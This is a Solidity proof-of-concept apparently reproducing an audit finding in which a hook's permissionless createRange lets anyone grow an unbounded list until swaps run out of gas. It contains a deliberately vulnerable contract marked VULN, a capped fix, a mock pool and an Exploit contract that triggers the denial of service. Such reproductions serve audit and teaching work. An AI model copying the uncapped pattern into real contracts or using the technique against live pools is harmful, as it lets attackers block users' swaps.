// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Paladin Valkyrie MultiRangeHook — permissionless createRange grows
    poolLpTokens without a cap (Cyfrin / Draiakoo, finding #61561, 12 March 2025).

    SYNTHETIC, cheatcode-free. afterSwap notifies every range. Each notify
    writes enough storage that 6 ranges do not fit in the swap stipend, so
    the swap reverts and N = 1000 IN stays with the user. The fixed hook
    caps the pool at 5 ranges. Five ranges fit, and the swap pays 1000 OUT.
    The per-range work is the real notify loop, scaled so the gas gap is
    measurable inside one transaction. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MultiRangeHook {
    address[] public poolLpTokens;
    mapping(address => mapping(uint256 => uint256)) public notified;
    uint256 public constant WORK = 6;

    function createRange() external returns (address lpToken) {
        // @> VULN: permissionless push, so poolLpTokens grows without a cap
        lpToken = address(uint160(poolLpTokens.length + 1));
        poolLpTokens.push(lpToken);
    }

    function afterSwap() external {
        uint256 n = poolLpTokens.length;
        for (uint256 i; i < n;) {
            _notifySwap(poolLpTokens[i]);
            unchecked {
                ++i;
            }
        }
    }

    function _notifySwap(address lpToken) internal {
        for (uint256 i; i < WORK;) {
            notified[lpToken][i] = i + 1;
            unchecked {
                ++i;
            }
        }
    }

    function rangeCount() external view returns (uint256) {
        return poolLpTokens.length;
    }
}

contract MultiRangeHookFixed {
    address[] public poolLpTokens;
    mapping(address => mapping(uint256 => uint256)) public notified;
    uint256 public constant WORK = 6;
    uint256 public constant MAX_RANGES = 5;

    function createRange() external returns (address lpToken) {
        require(poolLpTokens.length < MAX_RANGES, "max ranges");
        lpToken = address(uint160(poolLpTokens.length + 1));
        poolLpTokens.push(lpToken);
    }

    function afterSwap() external {
        uint256 n = poolLpTokens.length;
        for (uint256 i; i < n;) {
            _notifySwap(poolLpTokens[i]);
            unchecked {
                ++i;
            }
        }
    }

    function _notifySwap(address lpToken) internal {
        for (uint256 i; i < WORK;) {
            notified[lpToken][i] = i + 1;
            unchecked {
                ++i;
            }
        }
    }
}

contract Pool {
    Token public tokenIn;
    Token public tokenOut;
    address public hook;
    uint256 public constant STIPEND = 770_000;

    constructor(Token in_, Token out_, address hook_) {
        tokenIn = in_;
        tokenOut = out_;
        hook = hook_;
    }

    function fund(uint256 amount) external {
        tokenOut.transferFrom(msg.sender, address(this), amount);
    }

    function swap(uint256 amountIn) external returns (bool ok, uint256 amountOut) {
        tokenIn.transferFrom(msg.sender, address(this), amountIn);
        (bool success,) = hook.call{gas: STIPEND}(abi.encodeWithSignature("afterSwap()"));
        if (!success) {
            tokenIn.transfer(msg.sender, amountIn);
            return (false, 0);
        }
        amountOut = amountIn;
        tokenOut.transfer(msg.sender, amountOut);
        return (true, amountOut);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;
    uint256 public constant RANGES = 6;

    Token public tokenIn;
    Token public tokenOut;
    MultiRangeHook public hook;
    Pool public pool;

    constructor() {
        tokenIn = new Token("In", "IN", 18);
        tokenOut = new Token("Out", "OUT", 18);
        hook = new MultiRangeHook();
        pool = new Pool(tokenIn, tokenOut, address(hook));
    }

    function run() external {
        tokenIn.mint(address(this), N);
        tokenOut.mint(address(this), N);
        tokenIn.approve(address(pool), N);
        tokenOut.approve(address(pool), N);
        pool.fund(N);
        for (uint256 i; i < RANGES; ++i) {
            hook.createRange();
        }
        require(hook.rangeCount() == RANGES, "six ranges");
        (bool ok, uint256 outAmt) = pool.swap(N);
        require(!ok, "swap should fail");
        require(outAmt == 0, "output was paid");
        require(tokenIn.balanceOf(address(this)) == N, "N was taken");
        require(tokenOut.balanceOf(address(this)) == 0, "user received output");
    }
}
